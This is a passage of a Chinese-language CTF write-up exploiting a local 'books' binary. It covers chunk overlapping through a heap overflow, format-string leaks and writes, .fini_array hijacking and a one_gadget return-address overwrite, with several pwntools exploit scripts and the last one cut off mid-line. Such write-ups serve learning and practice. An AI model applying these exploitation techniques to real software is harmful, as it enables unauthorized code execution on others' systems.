+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 找到程序入口点</span></span><br><span class="line">➜  /ctf readelf -h books | grep Entry</span><br><span class="line">  Entry point address:               0x400780</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 查看入口点附近的代码</span></span><br><span class="line">➜  /ctf objdump -d books | grep -A 20 <span class="string">&quot;400780&quot;</span></span><br><span class="line">0000000000400780 &lt;.text&gt;:</span><br><span class="line">  400780:       31 ed                   xor    %ebp,%ebp</span><br><span class="line">  400782:       49 89 d1                mov    %rdx,%r9</span><br><span class="line">  400785:       5e                      pop    %rsi</span><br><span class="line">  400786:       48 89 e2                mov    %rsp,%rdx</span><br><span class="line">  400789:       48 83 e4 f0             and    <span class="variable">$0xfffffffffffffff0</span>,%rsp</span><br><span class="line">  40078d:       50                      push   %rax</span><br><span class="line">  40078e:       54                      push   %rsp</span><br><span class="line">  40078f:       49 c7 c0 20 0d 40 00    mov    <span class="variable">$0x400d20</span>,%r8 <span class="comment"># __libc_csu_fini</span></span><br><span class="line">  400796:       48 c7 c1 b0 0c 40 00    mov    <span class="variable">$0x400cb0</span>,%rcx <span class="comment"># __libc_csu_init</span></span><br><span class="line">  40079d:       48 c7 c7 39 0a 40 00    mov    <span class="variable">$0x400a39</span>,%rdi <span class="comment"># &lt;-- 这个就是 main！</span></span><br><span class="line">  4007a4:       e8 87 ff ff ff          call   400730 </span><br></pre></td></tr></table></figure>
+
+<p>原理就是 main 地址作为第一个参数传给 __libc_start_main。当然，在反编译里找也能找到，不过就有些麻烦。</p>
+<p>简单了解一下开发：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编译时带调试信息，文件较大</span></span><br><span class="line">gcc -g program.c -o program_with_debug</span><br><span class="line"><span class="comment"># strip 之后，只保留动态链接需要的符号，main、自定义函数名都不见了，文件较小</span></span><br><span class="line">strip program_with_debug -o program_stripped</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="第一步：控制-dest-堆块"><a href="#第一步：控制-dest-堆块" class="headerlink" title="第一步：控制 _dest 堆块"></a>第一步：控制 _dest 堆块</h3><p>一开始本人看到这里认为简单的堆溢出就可以控制 _dest，不过，根据下面截取的部分分支代码，可以看到在编辑 order 之后会有一个 strcpy 函数向 _dest 写入数据，即使 order2 溢出到了 _dest，依然会被覆写。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter first order:&quot;</span>);</span><br><span class="line">  edit_order(Order1);</span><br><span class="line">  <span class="built_in">strcpy</span>(_dest,<span class="string">&quot;Your order is submitted!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter second order:&quot;</span>);</span><br><span class="line">  edit_order(Order2);</span><br><span class="line">  <span class="built_in">strcpy</span>(_dest,<span class="string">&quot;Your order is submitted!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>分析程序，在 submit 之前分配了三个0x80的堆块，submit选项后又会分配一个0x140的堆块，于是思考通过构造 chunk overlapping 再次覆写 _dest 区域。</p>
+<p>思路(需调整)：order1 堆块溢出修改 order2 堆块的 size 域为0x151，再通过 delete 选项 free 掉 order2，于是 submit 选项分配的0x140堆块会重叠所有 order2 区域以及部分 _dest 区域，在这个部分 _dest 区域就可以布置格式化字符串。如图所示。</p>
+<p><img src="/images/26-03-09-fini_array%E5%8A%AB%E6%8C%81/heap.png" alt="image-20260309112950042"></p>
+<p>实际调试过程中发现，如果先溢出覆写size再free会触发double free错误(还没看出为什么)，所以更稳妥的方式是先 free 掉 order2 再溢出覆写 size。现阶段exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./books&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./books&quot;</span>)</span><br><span class="line"><span class="comment">#libc = libc(&quot;/glibc/2.23/64/lib/libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order1</span>(<span class="params">content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Submit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter first order:\n&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order2</span>(<span class="params">content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Submit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter second order:\n&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):  <span class="comment"># idx: 1=order1, 2=order2</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Submit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx+<span class="number">2</span>)) <span class="comment"># 3:Delete order1, 4:Delete order2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Submit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">order2(<span class="string">b&quot;2222&quot;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">order1(<span class="string">b&quot;a&quot;</span>*<span class="number">0x80</span> + p64(<span class="number">0</span>) + <span class="string">b&quot;\x51\x01&quot;</span>)</span><br><span class="line">order1(<span class="string">b&quot;1111&quot;</span>)</span><br><span class="line">submit()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<blockquote>
+<p>Order 1: 1111<br>Order 2: Order 1: 1111<br>Order 2:<br>Your order is submitted!<br>[*] Process ‘.&#x2F;books’ stopped with exit code 0 (pid 476)</p>
+</blockquote>
+<p>这个输出很好的验证了我们的思路，演绎一下这里的输出：造成堆块重叠后，程序向新分配的0x140堆块区域拼接 order1 和 order2，实际上是在 order2 区域输入拼接的数据，程序首先输入了”Order 1: “和 order1 区域内容，再输入”Order 2: “，之后寻找 order2 的内容，发现它正好是之前输入的”Order 1: 1111\nOrder 2: “，于是又把这些输入进去，造成如上输出。</p>
+<p>当然，很明显这里并没有覆盖到 _dest 区域，不过有了上面这些理论验证，我们只需要调整 order1 输入的数据即可覆盖到 _dest 。</p>
+<p>这里需要计算一下，已知 submit 堆块覆盖全部 order2 区域，要覆盖 _dest 需要填充0x80的 order2 区域以及0x10的 _dest 元数据，共 144 字节。根据上面的输出结果，必然会出现”Order 1: “和”\nOrder 2: Order 1: “，算上空格和换行符共 28 字节，所以说我们需要在 order1 输入format string + padding &#x3D; 144-28 &#x3D; 116字节。</p>
+<p>修改此处exp验证：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">order2(<span class="string">b&quot;2222&quot;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">order1(<span class="string">b&quot;a&quot;</span>*<span class="number">0x80</span> + p64(<span class="number">0</span>) + <span class="string">b&quot;\x51\x01&quot;</span>)</span><br><span class="line">order1(<span class="string">b&quot;%p.&quot;</span>*<span class="number">5</span> + <span class="string">b&quot;b&quot;</span>*<span class="number">101</span>) <span class="comment"># 3*5 + 101 =116</span></span><br><span class="line">submit()</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<blockquote>
+<p>Order 1: %p.%p.%p.%p.%p.bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb<br>Order 2: Order 1: %p.%p.%p.%p.%p.bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb<br>Order 2:<br>(nil).0x7b15f6dad780.0x7ffffef0.0x8.0x10f.bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb<br>Order 2:<br>[*] Process ‘.&#x2F;books’ stopped with exit code 0 (pid 370)</p>
+</blockquote>
+<p>可以看到我们控制了_dest，在原本输出”Your order is submitted!\n”的地方泄露了五个栈上的内容。</p>
+<h3 id="第二步：劫持-fini-array触发循环"><a href="#第二步：劫持-fini-array触发循环" class="headerlink" title="第二步：劫持.fini_array触发循环"></a>第二步：劫持.fini_array触发循环</h3><p>我们回到.fini_array劫持，此时我们拥有了泄露栈的能力，想要继续向.fini_array写，我们需要让.fini_array地址出现在栈上。</p>
+<p>来看开头的分支部分：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fgets(local_98,<span class="number">0x80</span>,<span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">switch</span>(local_98[<span class="number">0</span>]) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter first order:&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里并没有像常规题目一样选择单字节读入，而是通过 fgets 读取了0x80字节。于是，我们在输入选项索引时可以一同输入一些地址，这些数据会被读取到栈上。我们如下修改exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Submit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;5&quot;</span>+p8(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x6011b8</span>)) <span class="comment"># .fini_array地址</span></span><br></pre></td></tr></table></figure>
+
+<p>调试发现地址出现到了栈上：</p>
+<blockquote>
+<p>08:0040│-008     0x7ffeef263648 —▸ 0x2e5ec130 ◂— ‘Your order is submitted!\n’<br>09:0048│ rax rbp 0x7ffeef263650 ◂— 0x35 &#x2F;* ‘5’ *&#x2F;<br>0a:0050│+008     0x7ffeef263658 —▸ 0x6011b8 —▸ 0x400830 ◂— cmp byte ptr [rip + 0x200c09], 0<br>0b:0058│ rdi-1   0x7ffeef263660 ◂— 0xff0000000000000a &#x2F; * ‘\n’ *&#x2F;</p>
+</blockquote>
+<p>调整发送多个%p.探针，输出如下：</p>
+<p><img src="/images/26-03-09-fini_array%E5%8A%AB%E6%8C%81/stack.png" alt="image-20260309200310388"></p>
+<p>地址在第13个参数处，另一点，main地址是0x400a39，.fini_array处地址是0x400830，于是使用 format string 的知识修改相应地址低2位即可。</p>
+<p>注意看第二个参数，查询一下发现它刚好是 _IO_stdfile_1_lock 函数的开头，并且是 libc 中的符号，所以通过偏移就可以计算 libc 基址，我们在第一步里直接泄露libc</p>
+<p>现阶段exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./books&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./books&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/glibc/2.23/64/lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order1</span>(<span class="params">content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Submit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter first order:\n&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order2</span>(<span class="params">content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Submit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter second order:\n&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):  <span class="comment"># idx: 1=order1, 2=order2</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Submit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx+<span class="number">2</span>)) <span class="comment"># 3:Delete order1, 4:Delete order2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Submit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;5&quot;</span>+p8(<span class="number">0</span>)*<span class="number">7</span>+p64(fini_array)) </span><br><span class="line"></span><br><span class="line">main_addr_low = <span class="number">0xa39</span> <span class="comment"># 0x400a39</span></span><br><span class="line">fini_array = <span class="number">0x6011b8</span></span><br><span class="line"></span><br><span class="line">order2(<span class="string">b&quot;2222&quot;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">order1(<span class="string">b&quot;a&quot;</span>*<span class="number">0x80</span> + p64(<span class="number">0</span>) + <span class="string">b&quot;\x51\x01&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;main_addr_low&#125;</span>c%13$hn&quot;</span>.encode()</span><br><span class="line">payload += <span class="string">b&quot;LEAK:%2$p&quot;</span> </span><br><span class="line">payload += <span class="string">b&quot;a&quot;</span>*(<span class="number">116</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">log.success(<span class="string">f&quot;Payload length: <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">order1(payload) </span><br><span class="line">submit()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Order 2: \n&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;LEAK:&quot;</span>)</span><br><span class="line">leak = io.recv(<span class="number">14</span>)</span><br><span class="line">log.success(<span class="string">f&quot;Leak address: <span class="subst">&#123;(leak)&#125;</span>&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>(leak, <span class="number">16</span>) <span class="comment">#注意转换整数</span></span><br><span class="line">libc_base = leak_addr - libc.symbols[<span class="string">&#x27;_IO_stdfile_1_lock&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;Libc base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#b fgets</span></span><br><span class="line"><span class="comment">#&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这个exp可以在 submit之后再次进入main，不过再次submit的话会有EOF。理论上来说这里是触发循环，但是由于我们修改了.fini_array，_dl_fini函数没有完全清理导致栈布局混乱，第二次退出时会返回到其它地址，导致循环失效。ai给出了另一个方案，即连续修改两个.fini_array内容，分别改成 __libc_csu_fini 地址和 main 地址，形成了一个递归调用链，这个听起来确实比较成熟，不过这里 .fini_array 只有一个槽，以后遇到题目再探索这个方案吧。</p>
+<h3 id="第三步：劫持GOT触发system-bin-sh"><a href="#第三步：劫持GOT触发system-bin-sh" class="headerlink" title="第三步：劫持GOT触发system(&#x2F;bin&#x2F;sh)"></a>第三步：劫持GOT触发system(&#x2F;bin&#x2F;sh)</h3><h4 id="思路一-不可行-："><a href="#思路一-不可行-：" class="headerlink" title="思路一(不可行)："></a>思路一(不可行)：</h4><p>这里我一开始想的是劫持GOT触发system(&#x2F;bin&#x2F;sh)，但是之前讲到由于栈布局混乱第二次submit不会回到main函数，即使我们修改了GOT表项也无法通过 free 触发 system(&#x2F;bin&#x2F;sh)。</p>
+<h4 id="思路二-可能可行-："><a href="#思路二-可能可行-：" class="headerlink" title="思路二(可能可行)："></a>思路二(可能可行)：</h4><p>当时还想过修改main函数的返回地址控制程序流，不过要修改多个地址，使用格式化字符串修改并布置ROP链不太现实(太麻烦)。</p>
+<h4 id="思路三-不可行-："><a href="#思路三-不可行-：" class="headerlink" title="思路三(不可行)："></a>思路三(不可行)：</h4><p>这里又想到开头分支处的 fgets 选项，之前我们通过 fgets 读取的0x80字节将.fini_array地址放到了栈上，所以我们也可以通过 fgets 在栈上预先布置好一些控制流指针，然后修改main函数的返回地址到这些控制流指针处。不过呢，因为这个ROP链不在栈顶，并且无法控制rsp指针到ROP链处，这种方法还是放弃了。</p>
+<h4 id="思路四-getshll-："><a href="#思路四-getshll-：" class="headerlink" title="思路四(getshll)："></a>思路四(getshll)：</h4><p>最后还是得用one_gadget，这里我的环境是 glibc 2.23，因为之前有的环境one_gadget打不通，所以作为一种最后手段。这里环境可以使用one_gadget</p>
+<p>我们依然使用多个%p来探测，发现在第28个参数的位置存在一个栈地址，调试如下：</p>
+<p><img src="/images/26-03-09-fini_array%E5%8A%AB%E6%8C%81/stack2.png" alt="image-20260310220214211"></p>
+<p>我们继续执行到第二个submit之后main函数的ret处，这里的栈顶就是返回地址，计算一下0x7ffc33di4b00-0x7ffc33d14948 &#x3D; 440，多次运行发现这个偏移是固定的。</p>
+<p>另提一嘴，从BACKTRACE也可以看到为什么这里劫持.fini_array并不能造成循环：第一次的ret会返回到__ libc_start_main+232，但是 __libc_start_main里调用的一些函数会留在BACKTRACE里，第二次ret直接进入 _dl_fini+455，跳过了.fini _array 的检查。</p>
+<p><img src="/images/26-03-09-fini_array%E5%8A%AB%E6%8C%81/stack3.png" alt="image-20260310220406665"></p>
+<p>于是我们在第一个submit时候，就可以泄露返回地址的位置。</p>
+<p>之后使用 fmt 将one_gadget覆写返回地址即可</p>
+<p>完整exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./books&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./books&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/glibc/2.23/64/lib/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order1</span>(<span class="params">content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Submit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter first order:\n&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order2</span>(<span class="params">content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Submit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Enter second order:\n&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):  <span class="comment"># idx: 1=order1, 2=order2</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Submit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx+<span class="number">2</span>)) <span class="comment"># 3:Delete order1, 4:Delete order2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Submit\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;5&quot;</span>+p8(<span class="number">0</span>)*<span class="number">7</span> + content) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detect</span>(): <span class="comment"># 多个%p输出探测参数位置</span></span><br><span class="line">    order2(<span class="string">b&quot;2222&quot;</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    order1(<span class="string">b&quot;a&quot;</span>*<span class="number">0x80</span> + p64(<span class="number">0</span>) + <span class="string">b&quot;\x51\x01&quot;</span>)</span><br><span class="line">    order1(<span class="string">b&quot;%p.&quot;</span>*<span class="number">38</span> + <span class="string">b&quot;b&quot;</span>*<span class="number">2</span>) <span class="comment"># 3*38 + 2 =116</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_addr_low = <span class="number">0xa39</span> <span class="comment"># 0x400a39</span></span><br><span class="line">fini_array = <span class="number">0x6011b8</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400d13</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">order2(<span class="string">b&quot;2222&quot;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">order1(<span class="string">b&quot;a&quot;</span>*<span class="number">0x80</span> + p64(<span class="number">0</span>) + <span class="string">b&quot;\x51\x01&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&quot;%<span class="subst">&#123;main_addr_low&#125;</span>c%13$hn&quot;</span>.encode()</span><br><span class="line">payload += <span class="string">b&quot;LEAK:%2$pSTACK:%28$p&quot;</span> <span class="comment"># 前者泄露libc，后者泄露栈</span></span><br><span class="line">payload += <span class="string">b&quot;a&quot;</span>*(<span class="number">116</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">log.success(<span class="string">f&quot;Payload length: <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">order1(payload) </span><br><span class="line">submit(p64(fini_array))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Order 2: \n&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;LEAK:&quot;</span>)</span><br><span class="line">leak = io.recv(<span class="number">14</span>)</span><br><span class="line">log.success(<span class="string">f&quot;Leak address: <span class="subst">&#123;(leak)&#125;</span>&quot;</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>(leak, <span class="number">16</span>) <span 